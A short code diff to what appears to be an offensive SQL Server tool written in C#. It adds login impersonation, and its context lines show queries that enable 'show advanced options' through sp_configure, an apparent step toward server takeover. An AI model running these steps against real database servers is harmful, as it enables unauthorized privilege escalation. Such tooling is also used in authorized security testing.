@@ -68,6 +68,14 @@ Optional arguments:
                 return;
             }
 
+            // I am confused about why it is necessary to perform this step as a separate procedure
+            // But it seems in-line impersonation doesn't work properly
+            if (!String.IsNullOrEmpty(argumentSet.impersonate))
+            {
+                Console.WriteLine("[*] Attempting impersonation as {0}", argumentSet.impersonate);
+                SQLExecutor.ExecuteProcedure(connection, "", argumentSet.impersonate);
+            }
+
             var queries = new List<string>();
 
             queries.Add("SELECT 1 as 'Enabling Advanced Options'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;");
